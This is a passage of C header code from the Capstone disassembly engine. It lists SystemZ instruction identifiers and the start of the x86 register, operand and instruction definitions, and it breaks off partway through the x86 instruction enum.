	SYSZ_INS_CXGBR,
	SYSZ_INS_CXLFBR,
	SYSZ_INS_CXLGBR,
	SYSZ_INS_CY,
	SYSZ_INS_DDB,
	SYSZ_INS_DDBR,
	SYSZ_INS_DEB,
	SYSZ_INS_DEBR,
	SYSZ_INS_DL,
	SYSZ_INS_DLG,
	SYSZ_INS_DLGR,
	SYSZ_INS_DLR,
	SYSZ_INS_DSG,
	SYSZ_INS_DSGF,
	SYSZ_INS_DSGFR,
	SYSZ_INS_DSGR,
	SYSZ_INS_DXBR,
	SYSZ_INS_EAR,
	SYSZ_INS_FIDBR,
	SYSZ_INS_FIDBRA,
	SYSZ_INS_FIEBR,
	SYSZ_INS_FIEBRA,
	SYSZ_INS_FIXBR,
	SYSZ_INS_FIXBRA,
	SYSZ_INS_FLOGR,
	SYSZ_INS_IC,
	SYSZ_INS_ICY,
	SYSZ_INS_IIHF,
	SYSZ_INS_IIHH,
	SYSZ_INS_IIHL,
	SYSZ_INS_IILF,
	SYSZ_INS_IILH,
	SYSZ_INS_IILL,
	SYSZ_INS_IPM,
	SYSZ_INS_L,
	SYSZ_INS_LA,
	SYSZ_INS_LAA,
	SYSZ_INS_LAAG,
	SYSZ_INS_LAAL,
	SYSZ_INS_LAALG,
	SYSZ_INS_LAN,
	SYSZ_INS_LANG,
	SYSZ_INS_LAO,
	SYSZ_INS_LAOG,
	SYSZ_INS_LARL,
	SYSZ_INS_LAX,
	SYSZ_INS_LAXG,
	SYSZ_INS_LAY,
	SYSZ_INS_LB,
	SYSZ_INS_LBH,
	SYSZ_INS_LBR,
	SYSZ_INS_LCDBR,
	SYSZ_INS_LCEBR,
	SYSZ_INS_LCGFR,
	SYSZ_INS_LCGR,
	SYSZ_INS_LCR,
	SYSZ_INS_LCXBR,
	SYSZ_INS_LD,
	SYSZ_INS_LDEB,
	SYSZ_INS_LDEBR,
	SYSZ_INS_LDGR,
	SYSZ_INS_LDR,
	SYSZ_INS_LDXBR,
	SYSZ_INS_LDXBRA,
	SYSZ_INS_LDY,
	SYSZ_INS_LE,
	SYSZ_INS_LEDBR,
	SYSZ_INS_LEDBRA,
	SYSZ_INS_LER,
	SYSZ_INS_LEXBR,
	SYSZ_INS_LEXBRA,
	SYSZ_INS_LEY,
	SYSZ_INS_LFH,
	SYSZ_INS_LG,
	SYSZ_INS_LGB,
	SYSZ_INS_LGBR,
	SYSZ_INS_LGDR,
	SYSZ_INS_LGF,
	SYSZ_INS_LGFI,
	SYSZ_INS_LGFR,
	SYSZ_INS_LGFRL,
	SYSZ_INS_LGH,
	SYSZ_INS_LGHI,
	SYSZ_INS_LGHR,
	SYSZ_INS_LGHRL,
	SYSZ_INS_LGR,
	SYSZ_INS_LGRL,
	SYSZ_INS_LH,
	SYSZ_INS_LHH,
	SYSZ_INS_LHI,
	SYSZ_INS_LHR,
	SYSZ_INS_LHRL,
	SYSZ_INS_LHY,
	SYSZ_INS_LLC,
	SYSZ_INS_LLCH,
	SYSZ_INS_LLCR,
	SYSZ_INS_LLGC,
	SYSZ_INS_LLGCR,
	SYSZ_INS_LLGF,
	SYSZ_INS_LLGFR,
	SYSZ_INS_LLGFRL,
	SYSZ_INS_LLGH,
	SYSZ_INS_LLGHR,
	SYSZ_INS_LLGHRL,
	SYSZ_INS_LLH,
	SYSZ_INS_LLHH,
	SYSZ_INS_LLHR,
	SYSZ_INS_LLHRL,
	SYSZ_INS_LLIHF,
	SYSZ_INS_LLIHH,
	SYSZ_INS_LLIHL,
	SYSZ_INS_LLILF,
	SYSZ_INS_LLILH,
	SYSZ_INS_LLILL,
	SYSZ_INS_LMG,
	SYSZ_INS_LNDBR,
	SYSZ_INS_LNEBR,
	SYSZ_INS_LNGFR,
	SYSZ_INS_LNGR,
	SYSZ_INS_LNR,
	SYSZ_INS_LNXBR,
	SYSZ_INS_LPDBR,
	SYSZ_INS_LPEBR,
	SYSZ_INS_LPGFR,
	SYSZ_INS_LPGR,
	SYSZ_INS_LPR,
	SYSZ_INS_LPXBR,
	SYSZ_INS_LR,
	SYSZ_INS_LRL,
	SYSZ_INS_LRV,
	SYSZ_INS_LRVG,
	SYSZ_INS_LRVGR,
	SYSZ_INS_LRVR,
	SYSZ_INS_LT,
	SYSZ_INS_LTDBR,
	SYSZ_INS_LTEBR,
	SYSZ_INS_LTG,
	SYSZ_INS_LTGF,
	SYSZ_INS_LTGFR,
	SYSZ_INS_LTGR,
	SYSZ_INS_LTR,
	SYSZ_INS_LTXBR,
	SYSZ_INS_LXDB,
	SYSZ_INS_LXDBR,
	SYSZ_INS_LXEB,
	SYSZ_INS_LXEBR,
	SYSZ_INS_LXR,
	SYSZ_INS_LY,
	SYSZ_INS_LZDR,
	SYSZ_INS_LZER,
	SYSZ_INS_LZXR,
	SYSZ_INS_MADB,
	SYSZ_INS_MADBR,
	SYSZ_INS_MAEB,
	SYSZ_INS_MAEBR,
	SYSZ_INS_MDB,
	SYSZ_INS_MDBR,
	SYSZ_INS_MDEB,
	SYSZ_INS_MDEBR,
	SYSZ_INS_MEEB,
	SYSZ_INS_MEEBR,
	SYSZ_INS_MGHI,
	SYSZ_INS_MH,
	SYSZ_INS_MHI,
	SYSZ_INS_MHY,
	SYSZ_INS_MLG,
	SYSZ_INS_MLGR,
	SYSZ_INS_MS,
	SYSZ_INS_MSDB,
	SYSZ_INS_MSDBR,
	SYSZ_INS_MSEB,
	SYSZ_INS_MSEBR,
	SYSZ_INS_MSFI,
	SYSZ_INS_MSG,
	SYSZ_INS_MSGF,
	SYSZ_INS_MSGFI,
	SYSZ_INS_MSGFR,
	SYSZ_INS_MSGR,
	SYSZ_INS_MSR,
	SYSZ_INS_MSY,
	SYSZ_INS_MVC,
	SYSZ_INS_MVGHI,
	SYSZ_INS_MVHHI,
	SYSZ_INS_MVHI,
	SYSZ_INS_MVI,
	SYSZ_INS_MVIY,
	SYSZ_INS_MVST,
	SYSZ_INS_MXBR,
	SYSZ_INS_MXDB,
	SYSZ_INS_MXDBR,
	SYSZ_INS_N,
	SYSZ_INS_NC,
	SYSZ_INS_NG,
	SYSZ_INS_NGR,
	SYSZ_INS_NGRK,
	SYSZ_INS_NI,
	SYSZ_INS_NIHF,
	SYSZ_INS_NIHH,
	SYSZ_INS_NIHL,
	SYSZ_INS_NILF,
	SYSZ_INS_NILH,
	SYSZ_INS_NILL,
	SYSZ_INS_NIY,
	SYSZ_INS_NR,
	SYSZ_INS_NRK,
	SYSZ_INS_NY,
	SYSZ_INS_O,
	SYSZ_INS_OC,
	SYSZ_INS_OG,
	SYSZ_INS_OGR,
	SYSZ_INS_OGRK,
	SYSZ_INS_OI,
	SYSZ_INS_OIHF,
	SYSZ_INS_OIHH,
	SYSZ_INS_OIHL,
	SYSZ_INS_OILF,
	SYSZ_INS_OILH,
	SYSZ_INS_OILL,
	SYSZ_INS_OIY,
	SYSZ_INS_OR,
	SYSZ_INS_ORK,
	SYSZ_INS_OY,
	SYSZ_INS_PFD,
	SYSZ_INS_PFDRL,
	SYSZ_INS_RISBG,
	SYSZ_INS_RISBHG,
	SYSZ_INS_RISBLG,
	SYSZ_INS_RLL,
	SYSZ_INS_RLLG,
	SYSZ_INS_RNSBG,
	SYSZ_INS_ROSBG,
	SYSZ_INS_RXSBG,
	SYSZ_INS_S,
	SYSZ_INS_SDB,
	SYSZ_INS_SDBR,
	SYSZ_INS_SEB,
	SYSZ_INS_SEBR,
	SYSZ_INS_SG,
	SYSZ_INS_SGF,
	SYSZ_INS_SGFR,
	SYSZ_INS_SGR,
	SYSZ_INS_SGRK,
	SYSZ_INS_SH,
	SYSZ_INS_SHY,
	SYSZ_INS_SL,
	SYSZ_INS_SLB,
	SYSZ_INS_SLBG,
	SYSZ_INS_SLBR,
	SYSZ_INS_SLFI,
	SYSZ_INS_SLG,
	SYSZ_INS_SLBGR,
	SYSZ_INS_SLGF,
	SYSZ_INS_SLGFI,
	SYSZ_INS_SLGFR,
	SYSZ_INS_SLGR,
	SYSZ_INS_SLGRK,
	SYSZ_INS_SLL,
	SYSZ_INS_SLLG,
	SYSZ_INS_SLLK,
	SYSZ_INS_SLR,
	SYSZ_INS_SLRK,
	SYSZ_INS_SLY,
	SYSZ_INS_SQDB,
	SYSZ_INS_SQDBR,
	SYSZ_INS_SQEB,
	SYSZ_INS_SQEBR,
	SYSZ_INS_SQXBR,
	SYSZ_INS_SR,
	SYSZ_INS_SRA,
	SYSZ_INS_SRAG,
	SYSZ_INS_SRAK,
	SYSZ_INS_SRK,
	SYSZ_INS_SRL,
	SYSZ_INS_SRLG,
	SYSZ_INS_SRLK,
	SYSZ_INS_SRST,
	SYSZ_INS_ST,
	SYSZ_INS_STC,
	SYSZ_INS_STCH,
	SYSZ_INS_STCY,
	SYSZ_INS_STD,
	SYSZ_INS_STDY,
	SYSZ_INS_STE,
	SYSZ_INS_STEY,
	SYSZ_INS_STFH,
	SYSZ_INS_STG,
	SYSZ_INS_STGRL,
	SYSZ_INS_STH,
	SYSZ_INS_STHH,
	SYSZ_INS_STHRL,
	SYSZ_INS_STHY,
	SYSZ_INS_STMG,
	SYSZ_INS_STRL,
	SYSZ_INS_STRV,
	SYSZ_INS_STRVG,
	SYSZ_INS_STY,
	SYSZ_INS_SXBR,
	SYSZ_INS_SY,
	SYSZ_INS_TM,
	SYSZ_INS_TMHH,
	SYSZ_INS_TMHL,
	SYSZ_INS_TMLH,
	SYSZ_INS_TMLL,
	SYSZ_INS_TMY,
	SYSZ_INS_X,
	SYSZ_INS_XC,
	SYSZ_INS_XG,
	SYSZ_INS_XGR,
	SYSZ_INS_XGRK,
	SYSZ_INS_XI,
	SYSZ_INS_XIHF,
	SYSZ_INS_XILF,
	SYSZ_INS_XIY,
	SYSZ_INS_XR,
	SYSZ_INS_XRK,
	SYSZ_INS_XY,

	SYSZ_INS_ENDING,   // <-- mark the end of the list of instructions
} sysz_insn;

//> Group of SystemZ instructions
typedef enum sysz_insn_group {
	SYSZ_GRP_INVALID = 0, // = CS_GRP_INVALID

	//> Generic groups
	// all jump instructions (conditional+direct+indirect jumps)
	SYSZ_GRP_JUMP,	// = CS_GRP_JUMP

	//> Architecture-specific groups
	SYSZ_GRP_DISTINCTOPS = 128,
	SYSZ_GRP_FPEXTENSION,
	SYSZ_GRP_HIGHWORD,
	SYSZ_GRP_INTERLOCKEDACCESS1,
	SYSZ_GRP_LOADSTOREONCOND,

	SYSZ_GRP_ENDING,   // <-- mark the end of the list of groups
} sysz_insn_group;

#ifdef __cplusplus
}
#endif

#endif

```

`libs/Capstone/include/x86.h`:

```h
#ifndef CAPSTONE_X86_H
#define CAPSTONE_X86_H

/* Capstone Disassembly Engine */
/* By Nguyen Anh Quynh <aquynh@gmail.com>, 2013-2014 */

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>

// Calculate relative address for X86-64, given cs_insn structure
#define X86_REL_ADDR(insn) (insn.address + insn.size + insn.detail->x86.disp)

//> X86 registers
typedef enum x86_reg {
	X86_REG_INVALID = 0,
	X86_REG_AH, X86_REG_AL, X86_REG_AX, X86_REG_BH, X86_REG_BL,
	X86_REG_BP, X86_REG_BPL, X86_REG_BX, X86_REG_CH, X86_REG_CL,
	X86_REG_CS, X86_REG_CX, X86_REG_DH, X86_REG_DI, X86_REG_DIL,
	X86_REG_DL, X86_REG_DS, X86_REG_DX, X86_REG_EAX, X86_REG_EBP,
	X86_REG_EBX, X86_REG_ECX, X86_REG_EDI, X86_REG_EDX, X86_REG_EFLAGS,
	X86_REG_EIP, X86_REG_EIZ, X86_REG_ES, X86_REG_ESI, X86_REG_ESP,
	X86_REG_FPSW, X86_REG_FS, X86_REG_GS, X86_REG_IP, X86_REG_RAX,
	X86_REG_RBP, X86_REG_RBX, X86_REG_RCX, X86_REG_RDI, X86_REG_RDX,
	X86_REG_RIP, X86_REG_RIZ, X86_REG_RSI, X86_REG_RSP, X86_REG_SI,
	X86_REG_SIL, X86_REG_SP, X86_REG_SPL, X86_REG_SS, X86_REG_CR0,
	X86_REG_CR1, X86_REG_CR2, X86_REG_CR3, X86_REG_CR4, X86_REG_CR5,
	X86_REG_CR6, X86_REG_CR7, X86_REG_CR8, X86_REG_CR9, X86_REG_CR10,
	X86_REG_CR11, X86_REG_CR12, X86_REG_CR13, X86_REG_CR14, X86_REG_CR15,
	X86_REG_DR0, X86_REG_DR1, X86_REG_DR2, X86_REG_DR3, X86_REG_DR4,
	X86_REG_DR5, X86_REG_DR6, X86_REG_DR7, X86_REG_FP0, X86_REG_FP1,
	X86_REG_FP2, X86_REG_FP3, X86_REG_FP4, X86_REG_FP5, X86_REG_FP6, X86_REG_FP7,
	X86_REG_K0, X86_REG_K1, X86_REG_K2, X86_REG_K3, X86_REG_K4,
	X86_REG_K5, X86_REG_K6, X86_REG_K7, X86_REG_MM0, X86_REG_MM1,
	X86_REG_MM2, X86_REG_MM3, X86_REG_MM4, X86_REG_MM5, X86_REG_MM6,
	X86_REG_MM7, X86_REG_R8, X86_REG_R9, X86_REG_R10, X86_REG_R11,
	X86_REG_R12, X86_REG_R13, X86_REG_R14, X86_REG_R15,
	X86_REG_ST0, X86_REG_ST1, X86_REG_ST2, X86_REG_ST3,
	X86_REG_ST4, X86_REG_ST5, X86_REG_ST6, X86_REG_ST7,
	X86_REG_XMM0, X86_REG_XMM1, X86_REG_XMM2, X86_REG_XMM3, X86_REG_XMM4,
	X86_REG_XMM5, X86_REG_XMM6, X86_REG_XMM7, X86_REG_XMM8, X86_REG_XMM9,
	X86_REG_XMM10, X86_REG_XMM11, X86_REG_XMM12, X86_REG_XMM13, X86_REG_XMM14,
	X86_REG_XMM15, X86_REG_XMM16, X86_REG_XMM17, X86_REG_XMM18, X86_REG_XMM19,
	X86_REG_XMM20, X86_REG_XMM21, X86_REG_XMM22, X86_REG_XMM23, X86_REG_XMM24,
	X86_REG_XMM25, X86_REG_XMM26, X86_REG_XMM27, X86_REG_XMM28, X86_REG_XMM29,
	X86_REG_XMM30, X86_REG_XMM31, X86_REG_YMM0, X86_REG_YMM1, X86_REG_YMM2,
	X86_REG_YMM3, X86_REG_YMM4, X86_REG_YMM5, X86_REG_YMM6, X86_REG_YMM7,
	X86_REG_YMM8, X86_REG_YMM9, X86_REG_YMM10, X86_REG_YMM11, X86_REG_YMM12,
	X86_REG_YMM13, X86_REG_YMM14, X86_REG_YMM15, X86_REG_YMM16, X86_REG_YMM17,
	X86_REG_YMM18, X86_REG_YMM19, X86_REG_YMM20, X86_REG_YMM21, X86_REG_YMM22,
	X86_REG_YMM23, X86_REG_YMM24, X86_REG_YMM25, X86_REG_YMM26, X86_REG_YMM27,
	X86_REG_YMM28, X86_REG_YMM29, X86_REG_YMM30, X86_REG_YMM31, X86_REG_ZMM0,
	X86_REG_ZMM1, X86_REG_ZMM2, X86_REG_ZMM3, X86_REG_ZMM4, X86_REG_ZMM5,
	X86_REG_ZMM6, X86_REG_ZMM7, X86_REG_ZMM8, X86_REG_ZMM9, X86_REG_ZMM10,
	X86_REG_ZMM11, X86_REG_ZMM12, X86_REG_ZMM13, X86_REG_ZMM14, X86_REG_ZMM15,
	X86_REG_ZMM16, X86_REG_ZMM17, X86_REG_ZMM18, X86_REG_ZMM19, X86_REG_ZMM20,
	X86_REG_ZMM21, X86_REG_ZMM22, X86_REG_ZMM23, X86_REG_ZMM24, X86_REG_ZMM25,
	X86_REG_ZMM26, X86_REG_ZMM27, X86_REG_ZMM28, X86_REG_ZMM29, X86_REG_ZMM30,
	X86_REG_ZMM31, X86_REG_R8B, X86_REG_R9B, X86_REG_R10B, X86_REG_R11B,
	X86_REG_R12B, X86_REG_R13B, X86_REG_R14B, X86_REG_R15B, X86_REG_R8D,
	X86_REG_R9D, X86_REG_R10D, X86_REG_R11D, X86_REG_R12D, X86_REG_R13D,
	X86_REG_R14D, X86_REG_R15D, X86_REG_R8W, X86_REG_R9W, X86_REG_R10W,
	X86_REG_R11W, X86_REG_R12W, X86_REG_R13W, X86_REG_R14W, X86_REG_R15W,

	X86_REG_ENDING		// <-- mark the end of the list of registers
} x86_reg;

//> Operand type for instruction's operands
typedef enum x86_op_type {
	X86_OP_INVALID = 0, // = CS_OP_INVALID (Uninitialized).
	X86_OP_REG, // = CS_OP_REG (Register operand).
	X86_OP_IMM, // = CS_OP_IMM (Immediate operand).
	X86_OP_MEM, // = CS_OP_MEM (Memory operand).
	X86_OP_FP,  //  = CS_OP_FP  (Floating-Point operand).
} x86_op_type;

//> AVX broadcast type
typedef enum x86_avx_bcast {
	X86_AVX_BCAST_INVALID = 0,	// Uninitialized.
	X86_AVX_BCAST_2,	// AVX512 broadcast type {1to2}
	X86_AVX_BCAST_4,	// AVX512 broadcast type {1to4}
	X86_AVX_BCAST_8,	// AVX512 broadcast type {1to8}
	X86_AVX_BCAST_16,	// AVX512 broadcast type {1to16}
} x86_avx_bcast;

//> SSE Code Condition type
typedef enum x86_sse_cc {
	X86_SSE_CC_INVALID = 0,	// Uninitialized.
	X86_SSE_CC_EQ,
	X86_SSE_CC_LT,
	X86_SSE_CC_LE,
	X86_SSE_CC_UNORD,
	X86_SSE_CC_NEQ,
	X86_SSE_CC_NLT,
	X86_SSE_CC_NLE,
	X86_SSE_CC_ORD,
	X86_SSE_CC_EQ_UQ,
	X86_SSE_CC_NGE,
	X86_SSE_CC_NGT,
	X86_SSE_CC_FALSE,
	X86_SSE_CC_NEQ_OQ,
	X86_SSE_CC_GE,
	X86_SSE_CC_GT,
	X86_SSE_CC_TRUE,
} x86_sse_cc;

//> AVX Code Condition type
typedef enum x86_avx_cc {
	X86_AVX_CC_INVALID = 0,	// Uninitialized.
	X86_AVX_CC_EQ,
	X86_AVX_CC_LT,
	X86_AVX_CC_LE,
	X86_AVX_CC_UNORD,
	X86_AVX_CC_NEQ,
	X86_AVX_CC_NLT,
	X86_AVX_CC_NLE,
	X86_AVX_CC_ORD,
	X86_AVX_CC_EQ_UQ,
	X86_AVX_CC_NGE,
	X86_AVX_CC_NGT,
	X86_AVX_CC_FALSE,
	X86_AVX_CC_NEQ_OQ,
	X86_AVX_CC_GE,
	X86_AVX_CC_GT,
	X86_AVX_CC_TRUE,
	X86_AVX_CC_EQ_OS,
	X86_AVX_CC_LT_OQ,
	X86_AVX_CC_LE_OQ,
	X86_AVX_CC_UNORD_S,
	X86_AVX_CC_NEQ_US,
	X86_AVX_CC_NLT_UQ,
	X86_AVX_CC_NLE_UQ,
	X86_AVX_CC_ORD_S,
	X86_AVX_CC_EQ_US,
	X86_AVX_CC_NGE_UQ,
	X86_AVX_CC_NGT_UQ,
	X86_AVX_CC_FALSE_OS,
	X86_AVX_CC_NEQ_OS,
	X86_AVX_CC_GE_OQ,
	X86_AVX_CC_GT_OQ,
	X86_AVX_CC_TRUE_US,
} x86_avx_cc;

//> AVX static rounding mode type
typedef enum x86_avx_rm {
	X86_AVX_RM_INVALID = 0,	// Uninitialized.
	X86_AVX_RM_RN,	// Round to nearest
	X86_AVX_RM_RD,	// Round down
	X86_AVX_RM_RU,	// Round up
	X86_AVX_RM_RZ,	// Round toward zero
} x86_avx_rm;

//> Instruction prefixes - to be used in cs_x86.prefix[]
typedef enum x86_prefix {
	X86_PREFIX_LOCK		= 	0xf0,	// lock (cs_x86.prefix[0]
	X86_PREFIX_REP		= 	0xf3,	// rep (cs_x86.prefix[0]
	X86_PREFIX_REPNE	= 	0xf2,	// repne (cs_x86.prefix[0]

	X86_PREFIX_CS		= 	0x2e,	// segment override CS (cs_x86.prefix[1]
	X86_PREFIX_SS		= 	0x36,	// segment override SS (cs_x86.prefix[1]
	X86_PREFIX_DS		= 	0x3e,	// segment override DS (cs_x86.prefix[1]
	X86_PREFIX_ES		= 	0x26,	// segment override ES (cs_x86.prefix[1]
	X86_PREFIX_FS		= 	0x64,	// segment override FS (cs_x86.prefix[1]
	X86_PREFIX_GS		= 	0x65,	// segment override GS (cs_x86.prefix[1]

	X86_PREFIX_OPSIZE	=	0x66,	// operand-size override (cs_x86.prefix[2]
	X86_PREFIX_ADDRSIZE	=	0x67,	// address-size override (cs_x86.prefix[3]
} x86_prefix;

// Instruction's operand referring to memory
// This is associated with X86_OP_MEM operand type above
typedef struct x86_op_mem {
	unsigned int segment; // segment register (or X86_REG_INVALID if irrelevant)
	unsigned int base;	// base register (or X86_REG_INVALID if irrelevant)
	unsigned int index;	// index register (or X86_REG_INVALID if irrelevant)
	int scale;	// scale for index register
	int64_t disp;	// displacement value
} x86_op_mem;

// Instruction operand
typedef struct cs_x86_op {
		x86_op_type type;	// operand type
		union {
			x86_reg reg;	// register value for REG operand
			int64_t imm;		// immediate value for IMM operand
			double fp;		// floating point value for FP operand
			x86_op_mem mem;		// base/index/scale/disp value for MEM operand
		};

		// size of this operand (in bytes).
		uint8_t size;

		// AVX broadcast type, or 0 if irrelevant
		x86_avx_bcast avx_bcast;

		// AVX zero opmask {z}
		bool avx_zero_opmask;
} cs_x86_op;

typedef struct x86Offsets {
	uint8_t displacement_offset; //Offset from Instruction->address
	uint8_t displacement_size;   //1,2,4,8

	uint8_t modrm_offset; // ModR/M offset, or 0 when irrelevant.

	uint8_t imm_offset; //Offset of imm value from Instruction->address
	uint8_t imm_size; //size of imm value
}x86Offsets;

// Instruction structure
typedef struct cs_x86 {
	// Instruction prefix, which can be up to 4 bytes.
	// A prefix byte gets value 0 when irrelevant.
	// prefix[0] indicates REP/REPNE/LOCK prefix (See X86_PREFIX_REP/REPNE/LOCK above)
	// prefix[1] indicates segment override (irrelevant for x86_64):
	// See X86_PREFIX_CS/SS/DS/ES/FS/GS above.
	// prefix[2] indicates operand-size override (X86_PREFIX_OPSIZE)
	// prefix[3] indicates address-size override (X86_PREFIX_ADDRSIZE)
	uint8_t prefix[4];

	// Instruction opcode, wich can be from 1 to 4 bytes in size.
	// This contains VEX opcode as well.
	// An trailing opcode byte gets value 0 when irrelevant.
	uint8_t opcode[4];

	// REX prefix: only a non-zero value is relavant for x86_64
	uint8_t rex;

	// Address size, which can be overrided with above prefix[5].
	uint8_t addr_size;

	// ModR/M byte
	uint8_t modrm;

	// SIB value, or 0 when irrelevant.
	uint8_t sib;

	// Displacement value, or 0 when irrelevant.
	int32_t disp;

	/* SIB state */
	// SIB index register, or X86_REG_INVALID when irrelevant.
	x86_reg sib_index;
	// SIB scale. only applicable if sib_index is relavant.
	int8_t sib_scale;
	// SIB base register, or X86_REG_INVALID when irrelevant.
	x86_reg sib_base;

	// SSE Code Condition
	x86_sse_cc sse_cc;

	// AVX Code Condition
	x86_avx_cc avx_cc;

	// AVX Suppress all Exception
	bool avx_sae;

	// AVX static rounding mode
	x86_avx_rm avx_rm;

	// Number of operands of this instruction,
	// or 0 when instruction has no operand.
	uint8_t op_count;

	cs_x86_op operands[8];	// operands for this instruction.
	x86Offsets offsets;
} cs_x86;

//> X86 instructions
typedef enum x86_insn {
	X86_INS_INVALID = 0,

	X86_INS_AAA,
	X86_INS_AAD,
	X86_INS_AAM,
	X86_INS_AAS,
	X86_INS_FABS,
	X86_INS_ADC,
	X86_INS_ADCX,
	X86_INS_ADD,
	X86_INS_ADDPD,
	X86_INS_ADDPS,
	X86_INS_ADDSD,
	X86_INS_ADDSS,
	X86_INS_ADDSUBPD,
	X86_INS_ADDSUBPS,
	X86_INS_FADD,
	X86_INS_FIADD,
	X86_INS_FADDP,
	X86_INS_ADOX,
	X86_INS_AESDECLAST,
	X86_INS_AESDEC,
	X86_INS_AESENCLAST,
	X86_INS_AESENC,
	X86_INS_AESIMC,
	X86_INS_AESKEYGENASSIST,
	X86_INS_AND,
	X86_INS_ANDN,
	X86_INS_ANDNPD,
	X86_INS_ANDNPS,
	X86_INS_ANDPD,
	X86_INS_ANDPS,
	X86_INS_ARPL,
	X86_INS_BEXTR,
	X86_INS_BLCFILL,
	X86_INS_BLCI,
	X86_INS_BLCIC,
	X86_INS_BLCMSK,
	X86_INS_BLCS,
	X86_INS_BLENDPD,
	X86_INS_BLENDPS,
	X86_INS_BLENDVPD,
	X86_INS_BLENDVPS,
	X86_INS_BLSFILL,
	X86_INS_BLSI,
	X86_INS_BLSIC,
	X86_INS_BLSMSK,
	X86_INS_BLSR,
	X86_INS_BOUND,
	X86_INS_BSF,
	X86_INS_BSR,
	X86_INS_BSWAP,
	X86_INS_BT,
	X86_INS_BTC,
	X86_INS_BTR,
	X86_INS_BTS,
	X86_INS_BZHI,
	X86_INS_CALL,
	X86_INS_CBW,
	X86_INS_CDQ,
	X86_INS_CDQE,
	X86_INS_FCHS,
	X86_INS_CLAC,
	X86_INS_CLC,
	X86_INS_CLD,
	X86_INS_CLFLUSH,
	X86_INS_CLGI,
	X86_INS_CLI,
	X86_INS_CLTS,
	X86_INS_CMC,
	X86_INS_CMOVA,
	X86_INS_CMOVAE,
	X86_INS_CMOVB,
	X86_INS_CMOVBE,
	X86_INS_FCMOVBE,
	X86_INS_FCMOVB,
	X86_INS_CMOVE,
	X86_INS_FCMOVE,
	X86_INS_CMOVG,
	X86_INS_CMOVGE,
	X86_INS_CMOVL,
	X86_INS_CMOVLE,
	X86_INS_FCMOVNBE,
	X86_INS_FCMOVNB,
	X86_INS_CMOVNE,
	X86_INS_FCMOVNE,
	X86_INS_CMOVNO,
	X86_INS_CMOVNP,
	X86_INS_FCMOVNU,
	X86_INS_CMOVNS,
	X86_INS_CMOVO,
	X86_INS_CMOVP,
	X86_INS_FCMOVU,
	X86_INS_CMOVS,
	X86_INS_CMP,
	X86_INS_CMPPD,
	X86_INS_CMPPS,
	X86_INS_CMPSB,
	X86_INS_CMPSD,
	X86_INS_CMPSQ,
	X86_INS_CMPSS,
	X86_INS_CMPSW,
	X86_INS_CMPXCHG16B,
	X86_INS_CMPXCHG,
	X86_INS_CMPXCHG8B,
	X86_INS_COMISD,
	X86_INS_COMISS,
	X86_INS_FCOMP,
	X86_INS_FCOMPI,
	X86_INS_FCOMI,
	X86_INS_FCOM,
	X86_INS_FCOS,
	X86_INS_CPUID,
	X86_INS_CQO,
	X86_INS_CRC32,
	X86_INS_CVTDQ2PD,
	X86_INS_CVTDQ2PS,
	X86_INS_CVTPD2DQ,
	X86_INS_CVTPD2PS,
	X86_INS_CVTPS2DQ,
	X86_INS_CVTPS2PD,
	X86_INS_CVTSD2SI,
	X86_INS_CVTSD2SS,
	X86_INS_CVTSI2SD,
	X86_INS_CVTSI2SS,
	X86_INS_CVTSS2SD,
	X86_INS_CVTSS2SI,
	X86_INS_CVTTPD2DQ,
	X86_INS_CVTTPS2DQ,
	X86_INS_CVTTSD2SI,
	X86_INS_CVTTSS2SI,
	X86_INS_CWD,
	X86_INS_CWDE,
	X86_INS_DAA,
	X86_INS_DAS,
	X86_INS_DATA16,
	X86_INS_DEC,
	X86_INS_DIV,
	X86_INS_DIVPD,
	X86_INS_DIVPS,
	X86_INS_FDIVR,
	X86_INS_FIDIVR,
	X86_INS_FDIVRP,
	X86_INS_DIVSD,
	X86_INS_DIVSS,
	X86_INS_FDIV,
	X86_INS_FIDIV,
	X86_INS_FDIVP,
	X86_INS_DPPD,
	X86_INS_DPPS,
	X86_INS_RET,
	X86_INS_ENCLS,
	X86_INS_ENCLU,
	X86_INS_ENTER,
	X86_INS_EXTRACTPS,
	X86_INS_EXTRQ,
	X86_INS_F2XM1,
	X86_INS_LCALL,
	X86_INS_LJMP,
	X86_INS_FBLD,
	X86_INS_FBSTP,
	X86_INS_FCOMPP,
	X86_INS_FDECSTP,
	X86_INS_FEMMS,
	X86_INS_FFREE,
	X86_INS_FICOM,
	X86_INS_FICOMP,
	X86_INS_FINCSTP,
	X86_INS_FLDCW,
	X86_INS_FLDENV,
	X86_INS_FLDL2E,
	X86_INS_FLDL2T,
	X86_INS_FLDLG2,
	X86_INS_FLDLN2,
	X86_INS_FLDPI,
	X86_INS_FNCLEX,
	X86_INS_FNINIT,
	X86_INS_FNOP,
	X86_INS_FNSTCW,
	X86_INS_FNSTSW,
	X86_INS_FPATAN,
	X86_INS_FPREM,
	X86_INS_FPREM1,
	X86_INS_FPTAN,
	X86_INS_FRNDINT,
	X86_INS_FRSTOR,
	X86_INS_FNSAVE,
	X86_INS_FSCALE,
	X86_INS_FSETPM,
	X86_INS_FSINCOS,
	X86_INS_FNSTENV,
	X86_INS_FXAM,
	X86_INS_FXRSTOR,
	X86_INS_FXRSTOR64,
	X86_INS_FXSAVE,
	X86_INS_FXSAVE64,
	X86_INS_FXTRACT,
	X86_INS_FYL2X,
	X86_INS_FYL2XP1,
	X86_INS_MOVAPD,
	X86_INS_MOVAPS,
	X86_INS_ORPD,
	X86_INS_ORPS,
	X86_INS_VMOVAPD,
	X86_INS_VMOVAPS,
	X86_INS_XORPD,
	X86_INS_XORPS,
	X86_INS_GETSEC,
	X86_INS_HADDPD,
	X86_INS_HADDPS,
	X86_INS_HLT,
	X86_INS_HSUBPD,
	X86_INS_HSUBPS,
	X86_INS_IDIV,
	X86_INS_FILD,
	X86_INS_IMUL,
	X86_INS_IN,
	X86_INS_INC,
	X86_INS_INSB,
	X86_INS_INSERTPS,
	X86_INS_INSERTQ,
	X86_INS_INSD,
	X86_INS_INSW,
	X86_INS_INT,
	X86_INS_INT1,
	X86_INS_INT3,
	X86_INS_INTO,
	X86_INS_INVD,
	X86_INS_INVEPT,
	X86_INS_INVLPG,
	X86_INS_INVLPGA,
	X86_INS_INVPCID,
	X86_INS_INVVPID,
	X86_INS_IRET,
	X86_INS_IRETD,
	X86_INS_IRETQ,
	X86_INS_FISTTP,
	X86_INS_FIST,
	X86_INS_FISTP,
	X86_INS_UCOMISD,
	X86_INS_UCOMISS,
	X86_INS_VCMP,
	X86_INS_VCOMISD,
	X86_INS_VCOMISS,
	X86_INS_VCVTSD2SS,
	X86_INS_VCVTSI2SD,
	X86_INS_VCVTSI2SS,
